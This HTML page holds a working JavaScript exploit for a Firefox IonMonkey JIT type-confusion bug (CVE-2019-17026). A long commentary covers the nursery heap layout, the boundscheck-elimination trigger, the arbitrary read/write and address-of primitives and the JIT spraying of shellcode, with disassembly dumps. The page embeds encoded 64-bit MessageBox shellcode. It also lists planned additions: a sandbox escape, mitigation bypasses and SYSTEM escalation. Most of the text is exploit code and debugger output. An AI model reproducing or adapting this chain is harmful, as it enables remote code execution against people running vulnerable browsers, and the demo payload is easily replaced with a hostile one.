<html>
<head>
</head>
<body>
<script>

/*

   _______    ________    ___   ____ _______       ____________ ___   _____
  / ____/ |  / / ____/   |__ \ / __ <  / __ \     <  /__  / __ \__ \ / ___/
 / /    | | / / __/________/ // / / / / /_/ /_____/ /  / / / / /_/ // __ \ 
/ /___  | |/ / /__/_____/ __// /_/ / /\__, /_____/ /  / / /_/ / __// /_/ / 
\____/  |___/_____/    /____/\____/_//____/     /_/  /_/\____/____/\____/  

Firefox 64-bit IonMonkey JIT/Type Confusion RCE                                                                            

~

Overview

These three arrays wiil appear in memory sequentially in the order they are declared within the same Nursery Chunk

struct NativeObject {
    void *GroupPtr;
    void *ShapePtr;
    void *SlotsPtr;
    void *ElementsPtr; // This does NOT point to the element metadata, it points OVER it to the actual element data itself.
}

typedef struct _ELEMENTS_METADATA {
    uint32_t Flags;
    uint32_t InitializedLength; // The number of elements actually initialized (will be 0 when Array first declared). If you do Array(50) then set index 20 to something, the length will become 20 (and 0-19 will be allocated but marked uninitialized).
    uint32_t Capacity; // Storage allocated for the array
    uint32_t Length; // The literal .length property. Thus Array(50) even though it has an initialized length and capavity of 0 would have a length of 50.
    // ...
} ELEMENTS_METADATA;

After garbage coillection, these appear as:

000000000B5BF100  000000000B5A5A60  <- array 1 native object
000000000B5BF108  000000000B5C21C8 
000000000B5BF110  0000000000000000  
000000000B5BF118  000000000B5BF130  <- array 1 element pointer
000000000B5BF120  0000000000000000  <- array 1 element metadata
000000000B5BF128  0000000000000006  
000000000B5BF130  FFFA800000000000  <- array 1 element data
000000000B5BF138  FFFA800000000000  
000000000B5BF140  FFFA800000000000  
000000000B5BF148  FFFA800000000000  
000000000B5BF150  FFFA800000000000  
000000000B5BF158  FFFA800000000000  
000000000B5BF160  000000000B5A5A90  <- array 2 native object
000000000B5BF168  000000000B5C21C8  
000000000B5BF170  0000000000000000  
000000000B5BF178  000000000B5BF190  
000000000B5BF180  0000007E00000000  <- Overwritten array 2 metadata (elements data)
000000000B5BF188  0000007E0000007E  
000000000B5BF190  0000000000000000  <- array 2 element data (where native object pointer actually goes)
000000000B5BF198  0000000000000000  
000000000B5BF1A0  0000000000000000  
000000000B5BF1A8  0000000000000000  
000000000B5BF1B0  0000000000000000  
000000000B5BF1B8  0000000000000000  
000000000B5BF1C0  000000000B5A5AC0  <- Start of array 3 native object
000000000B5BF1C8  000000000B5C21C8 
000000000B5BF1D0  0000000000000000  
000000000B5BF1D8  000000000B5BF1F0  
000000000B5BF1E0  0000000000000000  <- array 3 metadata
000000000B5BF1E8  0000000000000006  
000000000B5BF1F0  0000000000000000  <- Element pointer mutable array 3
000000000B5BF1F8  0000000000000000  
000000000B5BF200  0000000000000000  

There are several key indexes which line up with this layout in memory:
1. Corruption of Array 2 metadata is done with indexes 10 and 11 of Array 1 (offsets 0x50 and 0x58 from Array 1 element data): 0x000000000B5BF180 - 000000000B5BF130
2. The slot pointer of the Array 3 native object is accessed with index 8 of Array 2 (offset 0x40 from Array 2 element data): 000000000B5BF1D0 - 000000000B5BF190

The heavy dependence on double floating points in this exploit causes a variety of issues to be considered.
Primarily, that certain values (particularly those with certain of their most significant 64 bits set)
cannot be treated as doubles by JS. This leads to many limitations:
1. The shellcode being JIT sprayed must be able to be 100% encoded as valid doubles. It may need to be
   modified (such as inserting NOPs at key offsets) to accomodate this reality.
2. The initial read primitive (memory leaking doubles) cannot leak 8 byte chunks of memory which cannot
   be interpreted as doubles. In certain cases, JS may even interpret them as tagged pointers, causing
   them to be dereferenced and crashing the process.
3. Both the read/write primitives cannot target addresses which cannot be stored as doubles since these
   addresses themselves must be stored and set as doubles in this source code. Similarly the value itself
   being written in the write primitive must be able to be encoded as a valid double otherwise it could
   not be passed as a double param to the arbitrary write function.
   
The R/W quirks in this exploit lead to some interesting issues and workarounds. Certain types of objects
in JS will be stored on the heap (which is only using 32-bits of the 64 bit address space and is thus
always interpreted as a valid double) while others (such as JIT'd code) will be stored in newly allocated
+RX virtual memory, which is going to use all 64-bits of its address space. This means that objects
stored on the stack/heap are going to generally be fair game, while JIT'd/non-heap regions will be off
limits to the initial R/W primitives.

Design

?

Payload

Presently the payload is a 64-bit MessageBox shellcode which will JIT sprayed as part of a series of floats
within an ordinary JS function (each line fo which containing a reference to atleast one 8 byte chunk of the
shellcode. Note that unlike other exploits such as my previous re-creation of CVE-2020-0674, there is a
dramatic reduction in complexity when it comes to shellcode execution and stealth in the context of a JIT
exploit. There is no need for a ROP chain to bypass DEP, as the JIT sprayed shellcode will already exist
within +RX regions of JIT memory. This means that there is also no need to concern oneself with exploit
mitigation features such as StackPivot protection, CallerCheck, SimExec etc. as these are ROP-oriented
mitigations. 

The shellcode source code itself can be found here: https://github.com/forrest-orr/ExploitDev/blob/master/Shellcode/Projects/MessageBox/Original/MessageBox64.asm

Notably, the task of converting a shellcode into an array of valid double floats can be quite tedious. Many
8 bytes sequences in the shellcode will not be considered to be valid doubles and thus cannot be properly encoded.
My solution to this was to identify the offsets in the shellcode which had double encoding issues and pad them
with NOP instructions until eventually the entire shellcode could be encoded as a single array of double floating
point values inn JS.

Despite these many benefits (as compared to exploits which require ROP chains and CFG bypass), the shellcode
in this exploit does still have one weakness which is EAF (it is resolving its API addresses via the Kernel32.dll
and NTDLL.DLL Export Address Tables. This may be an issue against EMET and its successor Windows Defender Exploit
Guard unless steps are taken to circumvent API resolution via exports, and rather to resolve them through via
imports itstead. 

Future improvements

1. WPAD sandbox escape via RPC chained with CVE-2020-0674
2. EAF/EAF+ bypasses for shellcode
3. Escalation to SYSTEM from LOCAL SERVICE via print spooler vulnerability and impersonation
4. Full attack chain working on Windows 8.1

Quirks

JIT compilation of memory layout post-heap-groom for the primary glitched JS function with the boundscheck
elimination is ineffective on Firefox 70 and 71 despite having only been patched after these releases. It does work
reliably on Firefox 65.

*/

var Shellcode = [ 0x44332211, 0x88776655, 0x08ec8348, 0xf7e48040, 0x88c1c748, 0xe8000d4e, 0x00000091, 0x48c78948, 0x5786c2c7, 0x8948000d, 0x00dee8f9, 0xb9480000, 0x72657375, 0x00003233, 0xe1894851, 0xe5894855, 0x20ec8348, 0x08ec8348, 0xf7e48040, 0x8948d0ff, 0xc7485dec, 0x06b81ac2, 0xc1894800, 0x0000abe8, 0xc9314d00, 0x7770b948, 0x0064656e, 0x49510000, 0xc748e089, 0x74656ec1, 0xb9485100, 0x2d747365, 0x2e72726f, 0x77b94851, 0x662e7777, 0x5172726f, 0x48e28948, 0x4855c931, 0x8348e589, 0x834820ec, 0x804008ec, 0xd0fff7e4, 0x5dec8948, 0x575041c3, 0xc8894956, 0x60c6c748, 0x65000000, 0x8b48ad48, 0x8b481840, 0x89483078, 0xc03148fe, 0x394805eb, 0x483474f7, 0x2f74f685, 0x385e8d48, 0x74db8548, 0xc2c7481a, 0x00000001, 0x084b8b48, 0x74c98548, 0x01a7e80a, 0x394c0000, 0x480874c0, 0x8b48c031, 0x48cbeb36, 0x5e10468b, 0xc358415f, 0xe5894855, 0x50ec8148, 0x57000002, 0x4d894856, 0x558948f8, 0xdb3148f0, 0x483c598b, 0x8348d901, 0x8b4818c1, 0x3148f875, 0x70598bdb, 0x48de0148, 0x8be87589, 0x45897441, 0x458b48c0, 0x205e8bf8, 0x48d80148, 0x48e04589, 0x48f8458b, 0x5e8bdb31, 0xd8014824, 0xd8458948, 0xf8458b48, 0x481c5e8b, 0x8948d801, 0x3148d045, 0x758948f6, 0x458b48c8, 0x18408be8, 0x0ff03948, 0x00010986, 0xf0894800, 0x850c8d48, 0x00000000, 0xe0558b48, 0xf8458b48, 0x48111c8b, 0x3148d801, 0xc18948d2, 0x0000f0e8, 0xf0453b00, 0x00d3850f, 0x89480000, 0x148d48f0, 0x458b4800, 0xb70f48d8, 0x8d480204, 0x0000850c, 0x8b480000, 0x8b48d055, 0x1c8bf845, 0xd8014811, 0xc8458948, 0xe84d8b48, 0x48ca8948, 0x5d8bdb31, 0xda0148c0, 0x0fc83948, 0x0000998c, 0xd0394800, 0x00908d0f, 0xc7480000, 0x0000c845, 0x31480000, 0x8d4890c9, 0xfffdb09d, 0x08148aff, 0x7400fa80, 0x2efa8028, 0x03c71975, 0x6c6c642e, 0x04c38348, 0x480003c6, 0xfeb09d8d, 0xff48ffff, 0x88daebc1, 0xc1ff4813, 0xebc3ff48, 0x0003c6d0, 0x48d23148, 0xfdb08d8d, 0x46e8ffff, 0x48000000, 0x4ee8c189, 0x48fffffe, 0x2e74c085, 0xb8458948, 0x48d23148, 0xfeb08d8d, 0x26e8ffff, 0x48000000, 0x8b48c289, 0x89e8b84d, 0x48fffffe, 0xebc84589, 0xc6ff4809, 0xfee7e990, 0x8b48ffff, 0x5f5ec845, 0x5dec8948, 0x894857c3, 0xdb3148d7, 0x74003980, 0x01b60f1a, 0xb60f600c, 0x48d301d0, 0xff48e3d1, 0xff8548c1, 0xff48e674, 0x48e1ebc1, 0xc35fd889, ];

////////
////////
// Global helpers/settings
////////

var JITIterations = 0x10000; // Number of iterations needed to trigger JIT compilation of code. 0x400+ works on FF 65, on 70 not even 0x10000 seems to work (the value in the original exploit at https://github.com/maxpl0it/CVE-2019-17026-Exploit/blob/master/calc.html)
var HelperBuf = new ArrayBuffer(8);
var HelperDouble = new Float64Array(HelperBuf);
var HelperDword = new Uint32Array(HelperBuf);

////////
////////
// Debug/timer code
////////

var EnableDebug = 1;
var EnableTimers = 0;
var AlertOutput = 1;
var TimeStart;
var ReadCount;

function StartTimer() {
    ReadCount = 0;
    TimeStart = new Date().getTime();
}

function EndTimer(Message) {
    var TotalTime = (new Date().getTime() - TimeStart);
    
    if(EnableTimers) {
        if(AlertOutput) {
            alert("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
        else {
            console.log("TIME ... " + Message + " time elapsed: " + TotalTime.toString(10) + " read count: " + ReadCount.toString(10));
        }
    }
}

function DebugLog(Message) {
    if(EnableDebug) {
        if(AlertOutput) {
            alert(Message);
        }
        else {
            console.log(Message); // In IE, console only works if devtools is open.
        }
    }
}

////////
////////
// MIR Boundscheck elimination bug/OOB glitch logic
////////

// Note that these cannot be declared as vars
SideEffectArray = [1.1, 1.2, , 1.4]; // MStoreElementHole access to a global sparse array is the unique edge case which resets the prevents it from being considered a dependency of the second Array1 boundscheck (thus allowing the first and second boundscheck to be considered for congruence and the second eliminated by the MIR optimizer)
BugArray1 = new Array(0x20); // This array will be used (after heap grooming) to make the OOB overwrite of BugArray2 metadata. The heap grooming requires the .length be set to 0, but the length will not matter due to boundscheck elimination (the capacity however still will).
BugArray2 = new Array(0x20); // This array will be used to read and set pointers reliably and repeatably in MutableArray
MutableArray = new Array(0x20); // The mutable array with capacity/boundscheck constraints lifted. Use of this array is primary limited to corrupting its Native Object pointers and reading/writing via its artificial "properties"

SideEffectArray.__defineSetter__("-1", function(x) { // Side effects called for OOB SideEffectArray access at index -1
    // Key to understand here is that setting these lengths to 0 and having GC manipulate them into pointing at each other could be done without the boundscheck elimination bug. The boundscheck elimination bug however is what allows them to actually access each other, as it is necessary to set .length to 0 to do the GC trick and the boundschecks are based on .length. Note that access to all of these arrays will still be limited by their capacity metadata field despite elimination of their .length boundscheck.
    BugArray1.length = 0;
    BugArray2.length = 0;
    MutableArray.length = 0;
    GC(); // The element data of each array will be freed, and each array will "fall" into the slot it left behind, thus leading to the Array1 element data pointer pointing at BugArray2 start (its metadata) and BugArray2 element data pointer pointing at MutableArray metadata,
});

function GC() { // Call the GC - Phoenhex function
    BufSize = (128 * 1024 * 1024); // 128MB
    
    for (i = 0; i < 3; i++) {
        var x = new ArrayBuffer(BufSize); // Allocate locally, but don't save
    }
}

function BuggedJITFunc(SideEffectIndex, Index, DblVal, bAct) {
    // Removes future bounds checks with GVN
    
    BugArray1[Index] = 4.2;
    BugArray1[Index - 1] = 4.2;

    // Triggers the side-effect function when a -1 index provided
    
    if(bAct)
    SideEffectArray[SideEffectIndex] = 2.2; // In the event the index 

    // Write out-of-bounds and corrupt Array2. Normally boundscheck would prevent this based on .length. Note that despite the bugged elimination of this check, access is still limited to the Array1 capacity metadata field.
    
    BugArray1[Index] = DblVal; // Corrupt the Array2 capacity and length element metadata - 0x7e 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
    BugArray1[Index - 1] = 2.673714696616e-312; // Corrupt the Array2 flags and initialized length element metadata - 0x00 0x00 0x00 0x00 0x7e 0x00 0x00 0x00
}

for(i = 0; i < JITIterations; i++) {
    SideEffectArray.length = 4; // Reset the length so that StoreElementHole node is used
    BuggedJITFunc(5, 11, 2.67371469724e-312, (i & 1) === 1);
}

// Call the JIT'd bugged function one more time, this time with an OOB write index of -1. There is substantial significance to using -1 as opposed to some other (larger) index which would still go OOB and trigger a side effect. The reason being that -1 is considered an "invalid index" (not just an OOB index) and is treated differently. OOB writes to the SideEffectArray with valid albeit indexes which will fail the boundscheck restrictions will not trigger useful side effects. The reason for this being that access to valid indexes will cause the creation of a MSetPropertyCache node in the MIR, a node which is not susceptible to the exploit condition. The MIR instruction chosen to handle the SideEffectArray OOB MUST be MStoreElementHole, and MStoreElementHole will only be selected in the event of an INVALID index access, not simply an OOB one.

SideEffectArray.length = 4; // Reset the length one more time
BuggedJITFunc(-1, 11, 2.67371469724e-312, true);

/*
for(i = 0; i < 10; i++) {
    HelperDouble[0] = BugArray2[i];
    DebugLog("Leaked from BugArray2 index " + i.toString(10) + ": 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
}

for(i = 0; i < 20; i++) {
    HelperDouble[0] = BugArray1[i];
    DebugLog("Leaked from BugArray1 index " + i.toString(10) + ": 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
}*/

// Initialize mutable array properties for R/W/Address-of primitives. Use these specific values so that it can later be verified whether slots pointer modifications have been successful.

MutableArray.x = 5.40900888e-315; // Most significant bits are 0 - no tag, allows an offset of 4 to be treated as a double
MutableArray.y = 0x41414141;
MutableArray.z = 0; // Least significant bits are 0 - offset of 4 means that y will be treated as a double

////////
////////
// Arbitrary read/write/address-of primitives
////////

/*

What makes the read "weak" is that the value which is actually being read at the provided address
must be a valid double. If specific bits are set in its most significant bits, it may be invalid
as a double and may be interpreted as a tagged pointer instead, which will cause JS to dereference it
and crash the process.

The MutableArray.NativeObj.SlotsPtr access via BugArray2[8] for both the R/W primitives translates
to offset 0x40 from BugArray2.NativeObj.ElementPtr.

*/

function AttemptLeakDbl(TargetAddressDbl) {
    SavedSlotsPtr = BugArray2[8];
    BugArray2[8] = TargetAddressDbl; // properties pointer - change the pointer of x
    //DebugLog("Weak read set slots pointer of Array2 native object to 0x" + HelperDword[1].toString(16) + HelperDword[0].toString(16));
    result = MutableArray.x;
    BugArray2[8] = SavedSlotsPtr;
    return result;
}

function WriteMemDbl(TargetAddressDbl, Val) { 
    SavedSlotsPtr = BugArray2[8];
    BugArray2[8] = TargetAddressDbl;
    MutableArray.x = Val;
    BugArray2[8] = SavedSlotsPtr;
}

/*

The concept here is that the mutable array slots pointer (in its native object struct) is
going to be pointing at an array of 3 property values (for x, y and z). Since we are trying
to leak the object address (which will be written into the property array slots for x, y or z)
as a double, we may fail to leak its address if this address cannot be represented as a valid
double. Thus the trick is to set the slots pointer in the mutable array native object ahead by
4 bytes. This the result that the object address (previously only in the "y" slot) can now be
partially read (32-bits at a time) from both "x" and "y" and that these values are now certain to
be valid doubles.

We can ensure the resulting double is valid by using bitwise AND to filter off the significant bits
responsible for differentiating between a valid and non-valid double.

*/

function AttemptLeakObjectAddressDbl(Obj) {
    SavedSlotsPtr = BugArray2[8]; 
    
    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????????????] | [Target object address] | [0x????????????????]
    MutableArray.y = Obj;

    //                                             x                       y                        z
    // MutableArray.NativeObj.SlotsPtr -> [0x????????Target o] | [bject adress????????] | [0x????????????????]
    
    HelperDouble[0] = BugArray2[8];
    HelperDword[0] = HelperDword[0] + 4;
    BugArray2[8] = HelperDouble[0];
    
    // Patch together a double of the target object address from the two 32-bit property values
    
    HelperDouble[0] = MutableArray.x;
    LeakedLow = HelperDword[1];
    HelperDouble[0] = MutableArray.y; // Works in release, not in debug (assertion issues)
    LeakedHigh = HelperDword[0] & 0x00007fff; // Filter off tagged pointer bits
    BugArray2[8] = SavedSlotsPtr;
    HelperDword[0] = LeakedLow;
    HelperDword[1] = LeakedHigh;
    
    return HelperDouble[0];
}

/*

These primitives solve the issue of attempting to read 8 bytes in memory which may be invalid
doubles and thus misinterpreted as pointers (for example if the tagged pointer bits are set).

The solution is to simply create a double float array, and then overwrite its data pointer
to point to the precise region we want to read. The key concept here is that it reduces the
ambiguity on the part of the JS engine. Since the JS engine knows that the value at this
address is explicitly a double float, it will not attempt to potentially interprete it as an
object pointer even if those tagged bits are set.

*/

MutableDblArray = new Float64Array(1); // Used for the strong read
MutableDblArrayDataPtr = null; // Save the pointer to the data pointer so we don't have to recalculate it each read

function ExplicitLeakDbl(TargetAddress) {
    WriteMemDbl(MutableDblArrayDataPtr, TargetAddress);
    return MutableDblArray[0];
}

////////
////////
// JIT spray/egghunter shellcode logic
////////

/*

JIT spray in modern Firefox 64-bit on Windows seems to behave very differently
when a special threshold of 100 double float constants are planted into a single
function and JIT sprayed. When more than 100 are implanted, the JIT code pointer
for the JIT sprayed function will look as follows:

00000087EB6F5280 | E9 23000000              | jmp 87EB6F52A8                          | <- JIT code pointer for JIT sprayed function points here
00000087EB6F5285 | 48:B9 00D0F2F8F1000000   | mov rcx,F1F8F2D000                      |
00000087EB6F528F | 48:8B89 60010000         | mov rcx,qword ptr ds:[rcx+160]          |
00000087EB6F5296 | 48:89A1 D0000000         | mov qword ptr ds:[rcx+D0],rsp           |
00000087EB6F529D | 48:C781 D8000000 0000000 | mov qword ptr ds:[rcx+D8],0             |
00000087EB6F52A8 | 55                       | push rbp                                |
00000087EB6F52A9 | 48:8BEC                  | mov rbp,rsp                             |
00000087EB6F52AC | 48:83EC 48               | sub rsp,48                              |
00000087EB6F52B0 | C745 E8 00000000         | mov dword ptr ss:[rbp-18],0             |
00000087EB6F52B7 | 48:C745 D0 00000000      | mov qword ptr ss:[rbp-30],0             |
00000087EB6F52BF | 48:8B4D 18               | mov rcx,qword ptr ss:[rbp+18]           |
00000087EB6F52C3 | 48:83E1 FC               | and rcx,FFFFFFFFFFFFFFFC                |
00000087EB6F52C7 | 48:8B59 28               | mov rbx,qword ptr ds:[rcx+28]           |
00000087EB6F52CB | 48:895D D0               | mov qword ptr ss:[rbp-30],rbx           |
00000087EB6F52CF | 49:BB E0D7F2F8F1000000   | mov r11,F1F8F2D7E0                      |
00000087EB6F52D9 | 49:3923                  | cmp qword ptr ds:[r11],rsp              |
00000087EB6F52DC | 0F86 1B000000            | jbe 87EB6F52FD                          |
00000087EB6F52E2 | 55                       | push rbp                                |
00000087EB6F52E3 | 48:8BDD                  | mov rbx,rbp                             |
00000087EB6F52E6 | 48:83EB 48               | sub rbx,48                              |
00000087EB6F52EA | 53                       | push rbx                                |
00000087EB6F52EB | C745 EC 50000000         | mov dword ptr ss:[rbp-14],50            | 50:'P'
00000087EB6F52F2 | 68 21600000              | push 6021                               |
00000087EB6F52F7 | E8 74D9FCFF              | call 87EB6C2C70                         |
00000087EB6F52FC | 5D                       | pop rbp                                 |
00000087EB6F52FD | 49:BB 88E33FFAF1000000   | mov r11,F1FA3FE388                      |
00000087EB6F5307 | 49:8303 01               | add qword ptr ds:[r11],1                |
00000087EB6F530B | 48:8B4D 28               | mov rcx,qword ptr ss:[rbp+28]           |
00000087EB6F530F | 49:BB B810EAFCF1000000   | mov r11,F1FCEA10B8                      | F1FCEA10B8:&"ðúmë‡"
00000087EB6F5319 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F531C | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F531E | 48:B9 40807975083D0000   | mov rcx,3D0875798040                    |
00000087EB6F5328 | 49:BB C810EAFCF1000000   | mov r11,F1FCEA10C8                      | F1FCEA10C8:&" ûmë‡"
00000087EB6F5332 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F5335 | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141                        |
00000087EB6F5341 | 53                       | push rbx                                |
00000087EB6F5342 | 49:BB D810EAFCF1000000   | mov r11,F1FCEA10D8                      | F1FCEA10D8:&"ðûmë‡"
00000087EB6F534C | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F534F | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F5351 | 48:83C4 08               | add rsp,8                               |
00000087EB6F5355 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                    |
00000087EB6F535F | 49:BB E810EAFCF1000000   | mov r11,F1FCEA10E8                      | F1FCEA10E8:&" ûmë‡"
00000087EB6F5369 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F536C | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F536E | 48:BB 9090554889E54883   | mov rbx,8348E58948559090                |
00000087EB6F5378 | 53                       | push rbx                                |
00000087EB6F5379 | 49:BB F810EAFCF1000000   | mov r11,F1FCEA10F8                      | F1FCEA10F8:&"ðûmë‡"
00000087EB6F5383 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F5386 | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F5388 | 48:83C4 08               | add rsp,8                               |
00000087EB6F538C | 48:B9 40807975083D0000   | mov rcx,3D0875798040                    |
00000087EB6F5396 | 49:BB 0811EAFCF1000000   | mov r11,F1FCEA1108                      | F1FCEA1108:&" ûmë‡"
00000087EB6F53A0 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F53A3 | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F53A5 | 48:BB EC404883EC084080   | mov rbx,804008EC834840EC                |
00000087EB6F53AF | 53                       | push rbx                                |
00000087EB6F53B0 | 49:BB 1811EAFCF1000000   | mov r11,F1FCEA1118                      | F1FCEA1118:&"ðûmë‡"
00000087EB6F53BA | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F53BD | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F53BF | 48:83C4 08               | add rsp,8                               |
00000087EB6F53C3 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                    |
00000087EB6F53CD | 49:BB 2811EAFCF1000000   | mov r11,F1FCEA1128                      | F1FCEA1128:&" ûmë‡"
00000087EB6F53D7 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F53DA | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F53DC | 48:BB E4F748B811223344   | mov rbx,44332211B848F7E4                |
00000087EB6F53E6 | 53                       | push rbx                                |
00000087EB6F53E7 | 49:BB 3811EAFCF1000000   | mov r11,F1FCEA1138                      | F1FCEA1138:&"ðûmë‡"
00000087EB6F53F1 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F53F4 | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F53F6 | 48:83C4 08               | add rsp,8                               |
00000087EB6F53FA | 48:B9 40807975083D0000   | mov rcx,3D0875798040                    |
00000087EB6F5404 | 49:BB 4811EAFCF1000000   | mov r11,F1FCEA1148                      | F1FCEA1148:&" ûmë‡"
00000087EB6F540E | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F5411 | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F5413 | 48:BB 55667788488945C8   | mov rbx,C845894888776655                |
00000087EB6F541D | 53                       | push rbx                                |
00000087EB6F541E | 49:BB 5811EAFCF1000000   | mov r11,F1FCEA1158                      | F1FCEA1158:&"ðûmë‡"
00000087EB6F5428 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F542B | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F542D | 48:83C4 08               | add rsp,8                               |
00000087EB6F5431 | 48:B9 40807975083D0000   | mov rcx,3D0875798040                    |
00000087EB6F543B | 49:BB 6811EAFCF1000000   | mov r11,F1FCEA1168                      | F1FCEA1168:&" ûmë‡"
00000087EB6F5445 | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F5448 | FF17                     | call qword ptr ds:[rdi]                 |
00000087EB6F544A | 48:BB 48C7C1884E0D00E8   | mov rbx,E8000D4E88C1C748                |
00000087EB6F5454 | 53                       | push rbx                                |
00000087EB6F5455 | 49:BB 7811EAFCF1000000   | mov r11,F1FCEA1178                      | F1FCEA1178:&"ðûmë‡"
00000087EB6F545F | 49:8B3B                  | mov rdi,qword ptr ds:[r11]              |
00000087EB6F5462 | FF17                     | call qword ptr ds:[rdi]                 |

Rather than implanting the double float constants into the JIT'd code region as
an array of raw constant data, the JIT engine has created a (very large) quantity
of code which manually generates code which handles each individual double float
one by one (this code code on much further than I have pasted here). You can
see this at:

00000087EB6F5337 | 48:BB 4141414100000000   | mov rbx,41414141  

Where what was intended to be JIT sprayed shellcode has begun to be utilized
constant by constant, one by one starting with the egg float 4141414100000000.

In contrast, any JIT sprayed function with less than 100 double floats yields
a substantially different region of code at its JIT code pointer:

000002C6944D4470 | 48:8B4424 20             | mov rax,qword ptr ss:[rsp+20]           | <- JIT code pointer for JIT sprayed function points here
000002C6944D4475 | 48:C1E8 2F               | shr rax,2F                              |
000002C6944D4479 | 3D F3FF0100              | cmp eax,1FFF3                           |
000002C6944D447E | 0F85 A4060000            | jne 2C6944D4B28                         |
000002C6944D4484 | E9 00000000              | jmp 2C6944D4489                         |
000002C6944D4489 | 49:BB 44631F50013B0000   | mov r11,3B01501F6344                    |
000002C6944D4493 | 41:8B03                  | mov eax,dword ptr ds:[r11]              |
000002C6944D4496 | 83C0 01                  | add eax,1                               |
000002C6944D4499 | 49:BB 44631F50013B0000   | mov r11,3B01501F6344                    |
000002C6944D44A3 | 41:8903                  | mov dword ptr ds:[r11],eax              |
000002C6944D44A6 | 3D A0860100              | cmp eax,186A0                           |
000002C6944D44AB | 0F86 14000000            | jbe 2C6944D44C5                         |
000002C6944D44B1 | 48:B8 30B14E5825000000   | mov rax,25584EB130                      |
000002C6944D44BB | 8378 28 00               | cmp dword ptr ds:[rax+28],0             |
000002C6944D44BF | 0F84 6A060000            | je 2C6944D4B2F                          |
000002C6944D44C5 | F2:0F1005 7B060000       | movsd xmm0,qword ptr ds:[2C6944D4B48]   | 000002C6944D4B48:"AAAA"
000002C6944D44CD | 48:B8 60B01C50013B0000   | mov rax,3B01501CB060                    |
000002C6944D44D7 | 48:8B40 10               | mov rax,qword ptr ds:[rax+10]           |
000002C6944D44DB | F2:0F1180 C8070000       | movsd qword ptr ds:[rax+7C8],xmm0       |
000002C6944D44E3 | F2:0F1005 65060000       | movsd xmm0,qword ptr ds:[2C6944D4B50]   |
000002C6944D44EB | F2:0F1180 D0070000       | movsd qword ptr ds:[rax+7D0],xmm0       |
000002C6944D44F3 | F2:0F1005 5D060000       | movsd xmm0,qword ptr ds:[2C6944D4B58]   |
000002C6944D44FB | F2:0F1180 D8070000       | movsd qword ptr ds:[rax+7D8],xmm0       | rax+7D8:"p\r"
000002C6944D4503 | F2:0F1005 55060000       | movsd xmm0,qword ptr ds:[2C6944D4B60]   |
...
000002C6944D4ACB | F2:0F1180 C00A0000       | movsd qword ptr ds:[rax+AC0],xmm0       |
000002C6944D4AD3 | F2:0F1005 6D030000       | movsd xmm0,qword ptr ds:[2C6944D4E48]   |
000002C6944D4ADB | F2:0F1180 C80A0000       | movsd qword ptr ds:[rax+AC8],xmm0       |
000002C6944D4AE3 | F2:0F1005 65030000       | movsd xmm0,qword ptr ds:[2C6944D4E50]   |
000002C6944D4AEB | F2:0F1180 D00A0000       | movsd qword ptr ds:[rax+AD0],xmm0       |
000002C6944D4AF3 | F2:0F1005 5D030000       | movsd xmm0,qword ptr ds:[2C6944D4E58]   |
000002C6944D4AFB | F2:0F1180 D80A0000       | movsd qword ptr ds:[rax+AD8],xmm0       |
000002C6944D4B03 | 48:B9 000000000080F9FF   | mov rcx,FFF9800000000000                |
000002C6944D4B0D | C3                       | ret                                     |
000002C6944D4B0E | 90                       | nop                                     |
000002C6944D4B0F | 90                       | nop                                     |
000002C6944D4B10 | 90                       | nop                                     |
000002C6944D4B11 | 90                       | nop                                     |
000002C6944D4B12 | 90                       | nop                                     |
000002C6944D4B13 | 90                       | nop                                     |
000002C6944D4B14 | 90                       | nop                                     |
000002C6944D4B15 | 90                       | nop                                     |
000002C6944D4B16 | 49:BB 30B14E5825000000   | mov r11,25584EB130                      |
000002C6944D4B20 | 41:53                    | push r11                                |
000002C6944D4B22 | E8 C9C6FBFF              | call 2C6944911F0                        |
000002C6944D4B27 | CC                       | int3                                    |
000002C6944D4B28 | 6A 00                    | push 0                                  |
000002C6944D4B2A | E9 11000000              | jmp 2C6944D4B40                         |
000002C6944D4B2F | 50                       | push rax                                |
000002C6944D4B30 | 68 20080000              | push 820                                |
000002C6944D4B35 | E8 5603FCFF              | call 2C694494E90                        |
000002C6944D4B3A | 58                       | pop rax                                 |
000002C6944D4B3B | E9 85F9FFFF              | jmp 2C6944D44C5                         |
000002C6944D4B40 | 6A 00                    | push 0                                  |
000002C6944D4B42 | E9 D9C5FBFF              | jmp 2C694491120                         |
000002C6944D4B47 | F4                       | hlt                                     |
000002C6944D4B48 | 41414141:0000            | add byte ptr ds:[r8],al                 | <- JIT sprayed egg double
000002C6944D4B4E | 0000                     | add byte ptr ds:[rax],al                |
000002C6944D4B50 | 90                       | nop                                     | <- JIT sprayed shellcode begins here
000002C6944D4B51 | 90                       | nop                                     |
